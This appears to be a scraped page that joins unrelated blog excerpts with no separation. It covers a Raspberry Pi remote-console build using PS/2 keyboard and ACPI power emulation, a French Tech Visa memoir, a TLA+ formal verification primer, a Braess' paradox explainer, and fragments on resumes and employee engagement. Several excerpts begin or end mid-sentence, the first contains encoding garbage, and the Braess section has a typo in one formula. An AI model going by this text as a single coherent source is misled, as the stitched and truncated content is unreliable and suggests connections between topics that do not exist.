href="https://github.com/Harvie/ps2dev"><code>ps2dev</code></a> library contains functions for mouse control as well.</p> <h3 id="power-control-via-ps2">Power Control via PS/2</h3> <p>Originally, I thought I was going to have to wire a relay to the motherboardâ€™s RESET pin to allow Pilo to control the computerâ€™s power. This is the approach that <a href="https://github.com/Fmstrat/diy-ipmi"><code>diy-ipmi</code></a>, another similar project, uses. However, while researching the keyboard controller, I rediscovered a long-lost secret of the PS/2 standard: the â€œACPI keysâ€�. ACPI, or the Advanced Configuration and Power Interface, is a set of power management standards for PCs. The PS/2 standards define <code>Power</code>, <a href="https://ux.stackexchange.com/q/83200/117790"><code>WakeUp</code></a>, and <code>Sleep</code> key scancodes that can be used to control the power status of the PC - just like the power button on the front of the box, a short-press of the <code>Power</code> key requests the OS to shutdown. However, on my motherboard, a long-press of <code>Power</code> does <em>NOT</em> seem to force the power off.</p> <p><img src="https://zach.bloomqu.ist/assets/pilo-bios-s5.png" alt="A screenshot of the BIOS with the ACPI S5 Wake-On-Keyboard option selected"></p> <p>Almost all BIOS support using the ACPI keys to power the system on from a powered down state. Above is what the option looks like in my BIOS (in ACPI, the powered-off state is known as â€œS5â€�). With this option enabled, sending the <code>Power</code> scancode will boot the computer up from an off state.</p> <p>So, now the Arduino has two responsibilities in Pilo: to send regular keypresses to the computer, and to send power commands to the computer. This saves us from having to install a relay for the motherboardâ€™s RESET pin.</p> <h2 id="capturing-video-output">Capturing Video Output</h2> <p>My server has a GPU with HDMI output, so I decided to use a USB HDMI capture card to get the video feed for Pilo. I found one on <a href="https://smile.amazon.com/gp/product/B08BZ52Q65/">Amazon for about $15</a>. When connected to the Pi, it acts as a regular USB webcam, available under <code>/dev/videoX</code>.</p> <p>Before this project, I had no experience with streaming video over the web. I decided to use <a href="https://www.linux-projects.org/uv4l/"><code>uv4l</code></a> (â€œUserspace Video4Linuxâ€�)â€™s <a href="https://www.linux-projects.org/home/documentation/uv4l-server/"><code>uv4l-server</code></a> component to set up an HTTP video server. <code>uv4l</code> makes it easy to set up a simple MJPEG stream, which is the goofiest possible video stream - each frame of the stream is a full JPEG image, sent to you in real time. As you can imagine, itâ€™s not the lightest on bandwidth, but it is easy to embed - all web browsers support embedding it in an <code>&lt;img&gt;</code> tag: <code>&lt;img src="/stream.mjpeg"/&gt;</code></p> <p>I configured the <code>uv4l-server</code> to only listen on <code>localhost</code>, with the idea that I could reverse-proxy connections to the video stream to provide security.</p> <h2 id="creating-the-application">Creating the application</h2> <p>For the Pilo interface, I decided to go with a web app, instead of something like VNC, or the actual IPMI protocol. This was mostly due to my background in web development, and the fact that the app can be accessed with a web browser, something every computer has installed. Here is a short video showing the completed Pilo app in action:</p> <video controls="" autoplay="" muted="" loop="" src="https://zach.bloomqu.ist/assets/pilo-demo.webm" type="video/webm"> <p>Your browser doesn't support WEBMs. <a href="https://zach.bloomqu.ist/assets/pilo-demo.webm">Download the video instead.</a></p> </video> <p>You can find the <a href="https://github.com/flotwig/pilo">GitHub repo for Pilo here</a>. It consists of two major components:</p> <ul> <li><a href="https://github.com/flotwig/pilo/tree/master/frontend"><code>frontend</code></a> - uses vanilla HTML/CSS/JS to display the interface, translate keypresses, and communicate with the server via websockets</li> <li><a href="https://github.com/flotwig/pilo/tree/master/server"><code>server</code></a> - the HTTP server, written in Node.js. Authenticates requests using HTTP basic auth, communicates with the keyboard controller via the <code>serialport</code> library, and manages reverse-proxying of the <a href="https://www.linux-projects.org/home/documentation/uv4l-server/"><code>uv4l-server</code></a> video stream</li> </ul> <p>There are also end-to-end tests in the <a href="https://github.com/flotwig/pilo/tree/master/e2e"><code>e2e</code></a> folder which use <a href="https://cypress.io/">Cypress</a> to test the application in real web browsers. This runs against Firefox and Chrome on every commit to CI via a <a href="https://github.com/flotwig/pilo/blob/master/.github/workflows/test.yml">GitHub Actions workflow</a>.</p> <p>The <a href="https://github.com/flotwig/pilo#pilo"><code>README</code></a> contains information on building and testing the project if you are interested in contributing. Built packages are also published to <code>npm</code> for production use.</p> <h2 id="packaging-the-pilo">Packaging the Pilo</h2> <p>One of my goals when building Pilo was to make it small enough to fit inside of my server case. Check out these photos to see how it fit in:</p> <p><img src="https://zach.bloomqu.ist/assets/pilo-in-server.jpg" alt="Left: Before Pilo. Right: After Pilo."> <small>Left: Server case before embedding the Pilo. Right: Server case after embedding the Pilo. HDMI, Ethernet, and micro-USB power are routed through the left-most PCI-E slot, while PS/2 is routed through the I/O shield in the top-right. The Pilo itself sits atop a ledge in the bottom-right of the image.</small></p> <p>Here are some pictures of how the final assembly was made:</p> <p><img src="https://zach.bloomqu.ist/assets/pilo-assembly.jpg" alt="Outer photo: Pi with USBs soldered on.

<p>Three years ago, things were different. I didn’t know any French, I didn’t have a business, and I didn’t have a job.</p>



<p>I had just quit a great job in Singapore to start my own company. My partner was starting her master’s in Paris and told me to come stay. So I packed up everything, shipped some of it to my mom in New York, and hopped on a flight to CDG.</p>



<figure><img src="http://christianpetroske.com/wp-content/uploads/2020/08/paris.png" alt="" srcset="https://christianpetroske.com/wp-content/uploads/2020/08/paris.png 878w, https://christianpetroske.com/wp-content/uploads/2020/08/paris-300x74.png 300w, https://christianpetroske.com/wp-content/uploads/2020/08/paris-768x191.png 768w" sizes="(max-width: 878px) 100vw, 878px"></figure>



<p>Around this time, French President Macron released an iconic video as part of the <a rel="noreferrer noopener" href="https://makeourplanetgreatagain.fr/en/business" target="_blank">Make Our Planet Great Again campaign</a>. He told scientists, researchers, and innovators from around the world to come to France. I was supposed to be an innovator now. My ears perked up.</p>



<p>“Your new homeland” it said. It continued: “Entrepreneurs and skilled employees from all over the world, France is made for you!”</p>



<p>Made for me, huh? Okay, I’ll bite.</p>



<p>I bit.</p>



<p>A few clicks later I found myself reading about <a rel="noreferrer noopener" href="https://lafrenchtech.com/en/how-france-helps-startups/french-tech-visa/" target="_blank">the French Tech Visa</a>, a visa scheme that awards founders of tech companies a visa for four years to live and start their business in France.</p>



<p>This seemed like the ultimate three-birds-one-stone: I would get to start my company, be with my partner, and live in effing Paris—learning French, discussing philosophy, eating croissants, whatever else people do in Paris. Life sorted for the next few years! Right?</p>



<p>In retrospect, I was right about the big stuff: starting the company, living with my partner, learning French, and the croissants (oh oui). </p>



<p>But it did not come easy. I learned a ton. I am incredibly grateful that it worked out. There were many moments when it almost didn’t. Through a combination of luck, hustle, privilege, and the kindness of others, I am where I am today: running my own business, living in France with my partner, speaking French, eating croissants, and looking back on it all muttering <em>putain</em> in happy disbelief.</p>



<p>Looking back too, I’m struck by how little information there was out there for people in my situation. I kept finding out critical information through chance conversations—and I’d done my research. I started thinking that he whole process should be a lot more transparent.</p>



<p>I’ve since had conversations with several people who were considering this path. So I decided to write down some of it to help others who are thinking about coming to France to start their company.</p>



<p>If that’s you, here are the basics of what you need to know. The challenge generally breaks down into 1) the visa, 2) the business, and 3) the language and culture.</p>



<p>(If you’re really serious about this, I’m writing a complete guide to the French Tech Visa which <a href="https://gum.co/SRUhE" target="_blank" rel="noreferrer noopener">you can preorder here</a>.)</p>



<h2>First: the visa</h2>



<p>There are three different French Tech visas: for <a rel="noreferrer noopener" href="https://lafrenchtech.com/en/how-france-helps-startups/french-tech-visa/visa-for-founders/" target="_blank">founders</a>, <a rel="noreferrer noopener" href="https://lafrenchtech.com/en/how-france-helps-startups/french-tech-visa/visa-for-employees/" target="_blank">employees</a>, and <a rel="noreferrer noopener" href="https://lafrenchtech.com/en/how-france-helps-startups/french-tech-visa/visa-for-les-investors/" target="_blank">investors</a>. I have the one for founders. That’s the one I know the most about, so it’s the one I focus on here.</p>



<p>The first step to getting the French Tech Visa for founders is to look at this list of incubators.</p>



<figure><a href="https://lafrenchtech.com/en/how-france-helps-startups/french-tech-visa/visa-for-founders/" target="_blank" rel="noopener noreferrer"><img src="http://christianpetroske.com/wp-content/uploads/2020/08/image-1024x707.png" alt="" srcset="https://christianpetroske.com/wp-content/uploads/2020/08/image-1024x707.png 1024w, https://christianpetroske.com/wp-content/uploads/2020/08/image-300x207.png 300w, https://christianpetroske.com/wp-content/uploads/2020/08/image-768x530.png 768w, https://christianpetroske.com/wp-content/uploads/2020/08/image-1536x1061.png 1536w, https://christianpetroske.com/wp-content/uploads/2020/08/image-2048x1414.png 2048w, https://christianpetroske.com/wp-content/uploads/2020/08/image-1200x829.png 1200w, https://christianpetroske.com/wp-content/uploads/2020/08/image-1980x1367.png 1980w" sizes="(max-width: 1024px) 100vw, 1024px"></a></figure>



<p>These incubators are all partnered with the French government to support foreign founders. The kind of support varies, but your goal is to find one that can offer you the visa.</p>



<p>One week, I decided I would do this. So I came up with a startup idea, made a pitch deck, website, and email address, and started sending emails. I reached out to probably 30 of these and had conversations with about 10 until it got down to 2-3 that seemed promising. </p>



<p>I just found the deck I made in Canva. It was an employee engagement app called Purpose, Go! (I know right?).</p>



<figure><img src="http://christianpetroske.com/wp-content/uploads/2020/08/image-2-1024x768.png" alt="" srcset="https://christianpetroske.com/wp-content/uploads/2020/08/image-2-1024x768.png 1024w, https://christianpetroske.com/wp-content/uploads/2020/08/image-2-300x225.png 300w, https://christianpetroske.com/wp-content/uploads/2020/08/image-2-768x576.png 768w, https://christianpetroske.com/wp-content/uploads/2020/08/image-2-1536x1152.png 1536w, https://christianpetroske.com/wp-content/uploads/2020/08/image-2-1200x900.png 1200w, https://christianpetroske.com/wp-content/uploads/2020/08/image-2.png 1754w" sizes="(max-width: 1024px) 100vw, 1024px"><figcaption>Lol ok, not bad. How an app was supposed to accomplish that, lord knows.</figcaption></figure>



<p>I ended up on the phone with <a rel="noreferrer noopener" href="https://theschoolab.com/en/" target="_blank">Schoolab</a> in Paris, who said they liked my idea and told me to come in to meet the team. I met them, did a tour, and got offered a spot. It cost me €650 a month for their 6 month program, including the visa, access to the community of startups and mentors, and office space. I took the deal.</p>



<p>Fees vary by incubator, but overall you’ll need around €5,000 in the bank to pay for the incubator program plus taxes and fees in the application process.</p>



<p>Then, you’ll need to prove that you have money equal to the French minimum wage (€18,254.60 in 2019). I didn’t have this. Instead, you can find someone who does have this kind of money to be your “guarantor”. The visa office will accept it as long as that person signs a letter saying they will support you if needed while you’re in France.</p>



<p>Once you get into the incubator, they will help you apply to get your three-page business proposal approved by the relevant government agency. They even helped me translate mine into French. It takes a couple of months, but once you have that approval letter, you are on the fast track for a four year visa.</p>



<p>There are differences by country, but being a US citizen, I had to go back to my home consulate in New York to complete the visa process.</p>



<p>I arrived in France in August, started the incubator in September, and didn’t get my provisional visa until February… So that gives you an idea. </p>



<h2>Second: the business</h2>



<p>Once I was in the incubator, the next challenge arose: What the hell was I going to do with this business?</p>



<p>For about two solid months I worked on Purpose, Go! alongside various client projects to keep some money coming in. I networked hard in the HR tech world in Paris and got to know some interesting people. But it became clear that these relationships were not going anywhere—and without relationships, I had no hope of selling into businesses.</p>



<p>So I started spending more time with a friend I’d made in the program, <a rel="noreferrer noopener" href="https://plentyworks.io/outer-space-mindset/" target="_blank">Buddhika</a>, who was working on a VR fitness company. When it became clear my thing wasn’t going to work (and they were struggling a bit too), we started talking in earnest about partnering up. Becoming co-founders.</p>



<p>So I started to work with them on the VR fitness idea. It was clear it was going to take a while to mature into something that could make money, so we looked around for income sources. One of our friends in the program needed an app built, so we decided to go into software development. That’s what led to our real French company.</p>



<p>We started out as individual micro-entrepreneurs, since it’s super easy to get started and get paid legally through that status. Eventually, we opened up a SAS entity in what seemed like an extremely painful and expensive process. It didn’t need to be.</p>



<p>The perfect time to start a SAS (the equivalent of a US Corporation) is when you’re building something you want to raise money for at some point. We wanted to keep our options open, so we did that. </p>



<p>Many small businesses start as SARL entities (rough equivalent of a US LLC) instead, since taxes are lower but fundraising ability is null.</p>



<p>Whatever you choose, the most important (and most difficult) thing is to find a way to actually get paid in the first place. French business is highly networked, even more so than the US, which means that people like to only do business with people they have a relationship with. So investing in building relationships is the number one most important thing you can do for the success of your French business.</p>



<p>Speaking of which…</p>



<h2>Third: the language</h2>



<p>To build relationships with people, you will need some level of French. It’s certainly possible to only run in circles where you can speak English, don’t get me wrong. But you will miss opportunities if you’re constrained by language.</p>



<p>One of the first places you may run into this problem is when looking for an incubator. Schoolab, for instance, has since shrunk or canceled their English-language programming since I was there because it was too difficult to maintain programs in two languages (and they couldn’t get everyone to switch over to English). </p>



<p>So how do you learn French quickly, cheaply, and effectively?</p>



<p>This is exactly what I tried to do, being hyper-conscious that my runway was dwindling with each passing month. Here was my rough language-learning regimen that got me conversational in about 6 months:</p>



<ul><li>Start out with cheap private lessons through iTalki. You can spend $10-15 an hour for a junior teacher to talk with you and teach you core grammar principles and vocab.</li><li>Listen to French podcasts constantly. This is key to improving comprehension. Read the transcript along if you can. My favorites at the beginning were <a rel="noreferrer noopener" href="https://savoirs.rfi.fr/fr/apprendre-enseigner/langue-fran%C3%A7aise/journal-en-fran%C3%A7ais-facile" target="_blank">Le Journal en Français Facile from RFI</a>, <a rel="noreferrer noopener" href="https://podcasts.apple.com/gb/podcast/learn-french-by-podcast/id160256534" target="_blank">Learn French by Podcast</a>, and <a rel="noreferrer noopener" href="https://podcasts.apple.com/gb/podcast/coffee-break-french/id263170419" target="_blank">Coffee Break French</a>. Now I love <a rel="noreferrer noopener" href="https://www.lesechos.fr/podcasts/la-story" target="_blank">La Story by Les Echos</a>, <a rel="noreferrer noopener" href="https://www.binge.audio/podcast/a-bientot-de-te-revoir/" target="_blank">A bientôt de te revoir</a>, and many more.</li><li>Read French news and blogs. Focus on what you’re interested in. I’m interested in technology and startups so I would read <a rel="noreferrer noopener" href="https://www.maddyness.com/" target="_blank">Maddyness</a>.</li><li>Get grammar lessons from YouTube. My hands-down favorite here is <a rel="noreferrer noopener" href="https://learnfrenchwithalexa.com/" target="_blank">Learn French with Alexa</a>. She explains even the advanced concepts so clearly.</li><li>And of course, take every opportunity to talk to real people! Having friends who are willing to suffer through your awful French (and laugh at you a bit, yes) is one of the things that will accelerate your learning the most. Go to events you find on Facebook. Take a dance class. Get out there. The more uncomfortable you are with your language ability, the more motivated you will be to learn faster.</li></ul>



<p>There’s also the culture to get used to, but maybe we’ll save that one for another post. </p>



<p>It’s wild that I’m coming up on three years in France. It has been an adventure. Hopefully some of this will help others navigating this for the first time. </p>

<p>When engineers were designing completely autonomously operated
<a href="https://en.wikipedia.org/wiki/Paris_M%C3%A9tro_Line_14">Paris Métro line 14</a>,
they
had to ensure the safety of tens of millions passengers each year, its 22 stations across Paris as
well as smooth running of trains. How to approach the development of software that allows for
the automation of public transit? The French team decided to use formal verification – learn
what it means!</p>

<p>We will go through an introduction to formally verified software,
note when formal verification gives most returns and present two introductory examples.
The first example will present a turnstile logic with a flip coin and the other one will be
a real, but still basic example of TLA+ methodology on the Die Hard with a Vengeance
problem with two jugs.</p>

<p>After reading the article you will gain an overview on fundamentals of Formally Verified
Software and will be aware of the method to avoid software bugs which can cause your business to
<a href="https://www.theregister.com/2020/08/13/yam_cryptocurrency_bug_governance/">implode</a>.</p>

<h2 id="why-do-systems-need-formal-verification">Why do systems need Formal Verification?</h2>

<p>In engineering we have methods to validate
(i.e. “Are we trying to make the product meet the user’s requirements?”)
and
verify (i.e. “Does the product conform to the validated specification?”).
In the realm of computer hardware Formal
Verification is a pretty old concept and has been in existence since 1984 with
tools like <a href="https://en.wikipedia.org/wiki/Verilog">Verilog</a> and now superseded
by tools like <a href="https://en.wikipedia.org/wiki/SystemVerilog">SystemVerilog</a>.
Such tools have become part of the IEEE specifications for designing and
verifying hardware.</p>

<p>However, in the realm of software engineering even though we have had
verification tools that have
<a href="https://en.wikipedia.org/wiki/List_of_model_checking_tools">existed</a> since late the
1980s, it still has not been standardized nor is in widespread use in comparison to its
hardware counterpart. Even when we see the use of Formal Verification, we can see
that it is usually limited to specific fields like cryptography or communication
protocols and is frequently done by the academic circles. A good example of
implementing formal methods of verification is the automation of <a href="https://en.wikipedia.org/wiki/Paris_M%C3%A9tro_Line_14">Paris Métro
line 14</a>.  With the ever
increasing complexity of software and the layers of abstraction, we have reached
a time when writing secure, efficient and resilient code requires some level of
formal verification to be done, if not for the whole software at least for the
important sub-systems involved. In recent times we have seen more
<a href="https://lamport.azurewebsites.net/tla/industrial-use.html">widespread adoption</a>
of formal verification by the industry leaders
like Intel, Amazon or Microsoft, in products where we
have enormous complexity and multiple systems interacting with one another.</p>

<h2 id="what-do-we-formally-verify">What do we formally verify?</h2>

<p>In the realm of software engineering, the first step of formal verification is asking the following questions:</p>

<ul>
<li>What do we intend to verify?</li>
<li>How do we verify?</li>
</ul>

<h3 id="what-do-we-intend-to-verify">What do we intend to verify?</h3>

<p>Setting out to verify the whole system and every line of written code, even though
theoretically possible, is a beginner’s mistake. The art of engineering is about being
smart enough to know which corners to cut and which ones not to cut. This is not
an easy task - it takes time, practice and experience to take decisions on
this. We should also keep in mind writing “verification” for a system is not the
same as writing tests (Unit / Functional) and fuzzing for it. Writing tests and
achieving 100% code coverage does not guarantee that the system works as
intended and it is only as good as tests themselves (after all, who tests the
unit tests?). Verification and testing can be considered to be two sides of the
same coin and one complements the other, completing the picture.</p>

<p>Formal verification involves writing proofs on an abstract “mathematical model”
of the system. Depending on the design of the system, there are various options
available which can be used as the basis for writing the proof of
verification. Let us take the case of <a href="https://tamarin-prover.github.io/">Tamarin
Prover</a> – the tool used for symbolic
modeling and analysis of security protocols. Here abstractions happen at the
protocol level and agents that interact with the protocol. This abstraction works
well for security and cryptography related code. Our approach discussed in this
article would be a more fine grained approach, trying to verify finite state
machines and this is called <a href="https://en.wikipedia.org/wiki/Model_checking">model
checking</a>.</p>

<h3 id="how-do-we-verify">How do we verify?</h3>

<p>Finite state machines are the simplest mathematical models of computation where
we represent states and the rules to transition from one state to another.
As an illustrative example let us take a closer look into the
working of a coin operated
<a href="https://en.wikipedia.org/wiki/Finite-state_machine#Example:_coin-operated_turnstile">turnstile</a>.</p>

<ul>
<li>We have a coin operated turnstile which is either in a “closed” state or “open” state.</li>
<li>We have a couple of operations that we can do on such a turnstile

<ul>
<li>We can “push” it.</li>
<li>We can “insert coin” into it.</li>
</ul></li>
<li>Applying the operations on a given state allows you transition between states
or keeps you in the same state depending on which operation is applied to
which state.</li>
</ul>

<p><img src="https://raw.githubusercontent.com/Moritz-Systems/moritz_staticDir/master/Turnstile_state_machine_colored.png" alt="The state diagram of a turnstile"></p>

<p>The above description can be represented as a diagram and this basically
constitutes the representation of a finite state machine.</p>

<p>Our aim is to verify that given this state machine, the turnstile works as
expected and more importantly, it does not enter an unexpected state. For example,
we do not want the turnstile to go “unlocked” without a coin or remain
“unlocked” after a push has been made.</p>

<p>A very simple way of thinking about this is to consider the state machine in a
linear timeline and the actions and transitions in this linear timeline.</p>

<p>Our reasoning on the working of the machine and the states it takes up is not
absolute :</p>

<ul>
<li>The turnstile is not guaranteed to be “open” at all points in time (or
“closed” for that matter)</li>
<li>The statement “The turnstile is open” has truth values that would vary with
time</li>
</ul>

<p>All this forms the basis of <a href="https://en.wikipedia.org/wiki/Temporal_logic">temporal
logic</a>.</p>

<p><strong><em>NOTE</em></strong>: <em>One of the basic things to keep at the back of the
mind would be that time continues to move forward in this universe even if no
further changes occur in the state machine.</em></p>

<p>So by verifying the behavior of the state machine through time one can in turn
verify the behavior of the system and its implementation. Of course things do
get complicated when these state machines are distributed over a network and
things happen in a concurrent system.</p>

<p>Let’s take a look at a very specific tool called
<a href="https://en.wikipedia.org/wiki/TLA%2B">TLA+</a>, which can be used to achieve state
machine verification for concurrent systems.</p>

<h3 id="why-tla">Why TLA+?</h3>

<p>TLA+ has been around since 1999, and is developed by <a href="https://en.wikipedia.org/wiki/Leslie_Lamport">Leslie
Lamport</a>, a Turing award winner.
In addition to writing
formal specification, it can also be used to design, model, document and verify
programs, especially concurrent systems and distributed systems. This is a good
toolkit to have since many of the systems level applications and blockchain
applications tend to have a combination of distributed and concurrent systems
at play.</p>

<p>TLA+ has been used to write up systems level proofs for things like Memory
<a href="https://en.wikipedia.org/wiki/Cache_coherence">Cache coherence</a> protocols to
distributed consensus protocols like
<a href="https://en.wikipedia.org/wiki/Raft_(computer_science)">Raft</a>. In addition to
this, TLA+ specification is also LaTeX compatible making for an excellent way to
generate documentation of the proofs.</p>

<h2 id="a-simple-tla-example">A simple TLA+ example</h2>

<p>Unfortunately, TLA+ does not come with a run off the mill “Hello, World”, like
most other programming languages. And we have to take a slightly bigger example
to understand the basics of TLA+. We shall choose one of the basic introductory
examples given in the TLA+ tutorials called <a href="https://lamport.azurewebsites.net/video/video4-script.pdf">Die
Hard</a> problem.</p>

<p><img src="https://raw.githubusercontent.com/Moritz-Systems/moritz_staticDir/master/die_hard_jugs.png" alt="Die Hard with a Vengeance, Jugs problem"></p>

<p>The name of the problem comes from the movie “Die Hard with a Vengeance”, where
the two heroes of the movie have to stop a bomb from exploding by placing 4
gallons of water in a jug. The twist being that the heroes are provided only with a
3-gallon jug, 5-gallon jug and a water faucet.</p>

<p>We solve this problem by starting to fill 5-gallon jug. This is the
approach taken in the movie.</p>

<ul>
<li>Make sure both the jugs are empty at the start.</li>
<li>Fill the 5-gallon jug.</li>
<li>Empty the 5-gallon jug into the 3-gallon jug.</li>
<li>We have 2 gallons of space in the 5-gallon jug.</li>
<li>Empty 3-gallon jug on to the ground.</li>
<li>Pour the remaining 2 gallons in the 5-gallon jug into the 3-gallon jug. (1
gallon space remaining in 3-gallon jug)</li>
<li>Fill the 5-gallon jug.</li>
<li>Pour 1 gallon out from the 5-gallon jug into the remaining space in the
3-gallon jug.</li>
</ul>

<p>By the end of this manual process we should have exactly 4 gallons of water in
the 5-gallon jug.</p>

<p><em>There is an alternative solution to this problem, by starting to fill the 3-gallon jug.
If can find it out, leave your solution in a comment.</em></p>

<p>The manual description of the solution happens in discrete steps, like following
states in a finite state machine. Each state is well defined and has a path to
the next state.</p>

<p>Now we are going to take a look at the solution from a TLA+ perspective.</p>

<p>We are not going to do any fancy stuff with TLA+ for now. But we will be
exploring the basic features of TLA+ and how it works, namely making it step
through a Finite state machine.</p>

<p><strong><em>NOTE:</em></strong>:<em>TLA+ uses a <a href="https://en.wikipedia.org/wiki/Breadth-first_search">breadth-first search</a>
approach when going through a state machine</em></p>

<p>Let us have a look at the TLA+ description of the <a href="https://github.com/jameshfisher/tlaplus/blob/master/examples/DieHard/DieHard.tla">Die
Hard</a>
problem.</p>

<ul>
<li><strong><em>Variables</em></strong> - These describe specification of the variables (jugs) in our problem.</li>
</ul>

<pre><code>  VARIABLES big,   \* The number of gallons of water in the 5-gallon jug.
            small  \* The number of gallons of water in the 3-gallon jug.
</code></pre>

<ul>
<li><strong><em>Invariants</em></strong> - These describe the invariants within our system, in our case the
values for the 3-gallon jug has to be between 0 and 3 (inclusive) and likewise
for the 5-gallon jug this has to be between 0 and 5 (inclusive). The invariants
keep a sanity check on the …</li></ul></div></div>

    Posted on August 10, 2019
    
        by Erik Davis
    
</p>




<p>Consider the following scenario. A large number of independent agents wish to traverse a network, from some start vertex to some end vertex. Each edge they travel will take some time, which could in general depend on the number of agents traveling along the edge. For the sake of simplicity, we’ll normalize things so that <span>\(x\)</span> denotes a proportion of agents (i.e. <span>\(x\)</span> ranges from 0 to 1). In what follows, we will let <span>\(\mathcal{E}\)</span> denote the set of edges, and <span>\(c_e :
[0,1] \to \mathbb{R}\)</span> the <em>cost</em> function associated with edge <span>\(e\)</span>. A very simple example is something like the following, where <span>\(s\)</span> is the start and <span>\(d\)</span> is the destination, and edges have been labeled with their cost.</p>
<div>
<p><img src="http://cadlag.org/ancillary/braess/initial.png" alt="A simple routing network, with variable edge cost."></p><p>A simple routing network, with variable edge cost.</p>
</div>
<p>One way to summarize the entire set of paths chosen is via a <em>flow</em> <span>\(f\)</span>, which assigns to each edge the normalized proportion of agents who have chosen to travel along it. For example, if all agents chose the top route in the above network, then we would have <span>\(f_{su} = 1, f_{ud} = 1\)</span> and <span>\(f_{sv} = 0, f_{vd} =
0\)</span>. There are of course other possible flows; one could consider the flow that puts all agents along the bottom path, or another which mixes the top and bottom paths somehow. <a href="#fn1" id="fnref1"><sup>1</sup></a></p>
<p>For a general flow <span>\(f\)</span>, the <em>total cost</em> borne by the agents in navigating the network is</p>
<p><span>\[
C(f) = \sum_{e \in E} f_e c_e(f_e).
\]</span></p>
<p>In the above example, routing all traffic along the top path (or equivalently, the bottom path) has a total cost of <span>\(2\)</span>. However, if one split the traffic so that half travels along the top path and half along the bottom path, then the total cost is only <span>\(0.5 c_{su}(0.5) + 0.5 \cdot c_{ud} + 0.5 \cdot c_{sv}(0.5) +
0.5 \cdot_{vd}(0.5) = 1.5\)</span>. In this example, this turns out that this is the minimum cost flow. One could imagine that if we were benevolent dictators controlling the choices of the agents, we might opt for this as an outcome.</p>

<p>Another way of looking at this routing problem is from the agent’s point of view. Suppose that, for each path <span>\(P\)</span>, some proportion of agents choose <span>\(P\)</span> for their traversal. In other words, we may imagine that we have a distribution <span>\(g\)</span> with <span>\(g_P \geq 0\)</span> and <span>\(\sum_{P \in \mathcal{P}} g_P = 1\)</span>, where <span>\(\mathcal{P}\)</span> denotes the set of <span>\(s-d\)</span> paths through the network. Thus <span>\(g_P\)</span> is the proportion of agents choosing path <span>\(P\)</span>. We’ll call such a <span>\(g\)</span> a <em>path distribution</em>, for lack of a better name.</p>
<p>There’s nothing lost by thinking about path distributions rather than flows. Indeed, given a path distribution <span>\(g\)</span> we can recover a flow by letting <span>\(f_e =
\sum_{P : e \in P} g_P\)</span>, where the sum is over all paths containing the edge <span>\(e\)</span>. It’s not hard to show that this is an honest flow.<a href="#fn2" id="fnref2"><sup>2</sup></a></p>
<p>So, from this vantage point: which path would an agent like to pick? In general, the cost of an edge depends on hhow much traffic it gets, so the answer is really contingent on the paths chosen by the other agents.</p>
<p>To give some clarity around this, let’s introduce an assumption about behavior: an agent will choose a path only if there are no cheaper alternatives. This is both a weak assumption, in the sense that it’s hard to argue with the rationale, and a strong one, in the sense that we’re granting each agent quite a lot of information about the problem at hand (e.g. the network topology, the behavior of the other agents, and so on).</p>
<p>With this in mind, note that relative to a fixed flow <span>\(f\)</span>, the cost of a path <span>\(P\)</span> is</p>
<p><span>\[ C(P; f) = \sum_{e \in P} c_e(f_e). \]</span></p>
<p>Formally, a path distribution <span>\(g\)</span> is said to be a (pure Nash) <em>equilibrium</em> distribution if</p>
<p><span>\[ g_P &gt; 0 \text{ only if } P \text{ minimizes } C(P; f), \]</span></p>
<p>where <span>\(f\)</span> is the flow associated with <span>\(g\)</span>.</p>
<p>In other words, in an equilibrium distribution every agent takes a path that is minimal <em>with respect to the flow induced by the others</em>.</p>
<p>It’s worth mulling this over a bit. With an equilibrium distribution, there’s no incentive for any particular agent to switch paths. Each agent sees the social world around it as essentially fixed; the others have induced some flow <span>\(f\)</span>, and the best one can do is pick the path that’s cheapest relative to this.</p>
<p>In our simple network, there is only one equilibrium distribution: half of the agents take the top path, and half take the bottom. The cost of this equilibrium distribution is <span>\(1.5\)</span>, just as before.</p>

<p>To briefly recap, we’ve singled out two sorts of flows as being special.</p>
<ul>
<li>Cost-minimizing flows are the ones that we’d pick if were playing the part of a benevolent dictator.</li>
<li>Equilibrium flows (i.e. those induced by an equilibrium path distribution) are the ones that we can imagine a bunch of independent agents settling for.</li>
</ul>
<p>It was something of a coincidence that in our toy network these two ended up being the same. But they don’t have to be.</p>
<p>So what happens if we start adding edges to the network? Naively, it seems like it can only make things better. Certainly, adding an edge doesn’t increase the cost of any previous flows (since they simply do not use the new edge), and in fact it’s possible that it makes available a new, cheaper flow. So as benevolent dictators, there’s not much to lose.</p>
<p>But what happens when we think from the agent’s perspective? Surprisingly enough, adding an edge can shift the equilibrium flow to something even costlier! For an extreme example, consider adding a free edge to our previous network.</p>
<div>
<p><img src="http://cadlag.org/ancillary/braess/augmented.png" alt="A network augmented with a zero cost edge."></p><p>A network augmented with a zero cost edge.</p>
</div>
<p>With this addition, the equilibrium distribution <a href="#fn3" id="fnref3"><sup>3</sup></a> puts all of the agents on the path <span>\(suvd\)</span>, for a total cost of 2! This is <a href="https://en.wikipedia.org/wiki/Braess%27s_paradox">Braess’ paradox</a>: adding capacity to a network can actually increase the cost of an equilibrium flow.</p>
<div>
<p><img src="http://cadlag.org/ancillary/braess/equilibrium.png" alt="The new equilibrium flow."></p><p>The new equilibrium flow.</p>
</div>
<p>I’m not going to prove that this flow is equilibrium, but let me give a glimpse of the incentives: the previous distribution, which put half of the agents on the top half and half of the agents on the bottom, is now unappealing from a traveller’s vantage point: relative to that flow, the effect of an agent on <span>\(sud\)</span> switching to <span>\(suvd\)</span> is to reduce their path cost by <span>\(0.5\)</span>. And so on.</p>

<p>By definition, an equilibrium flow is at least as costly as a cost-minimizing flow. The ratio</p>
<p><span>\[ \frac{\text{maximum cost of an equilibrium flow}}{\text{cost of min cost flow}} \]</span></p>
<p>is sometimes referred to as the <a href="https://en.wikipedia.org/wiki/Price_of_anarchy">Price of Anarchy</a>. For our original network, it was <span>\(1\)</span>. After adding the edge, it was <span>\(4/3\)</span>.</p>

Even if you have decades of experience, your resume needs to be compelling enough to leave an impression <b>within ten seconds. </b>When you're at the top of the funnel, that is about how long someone will glance at your resume before moving on to the next one.</p><p>A description that is loaded with responsibility and impact, or runs on more than a sentence or two - can actually have the reverse effect!

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div role="main">

    <article>

        

        <section>

            <p>Most people leave their job because of <a href="https://www.forbes.com/sites/victorlipman/2015/08/04/people-leave-managers-not-companies/#1000172847a9">their manager</a>. They leave their manager because they are not engaged in their work. So how do you, as a leader, engage your employees?</p>

<p>You might think it is giving them interesting work. You might think it is giving them lots of money and paying at the top of the industry. You might also think it is free lunch, free massages, and other cool perks you saw some Silicon Valley company offering their employees.</p>

<p>You’d be wrong.</p>
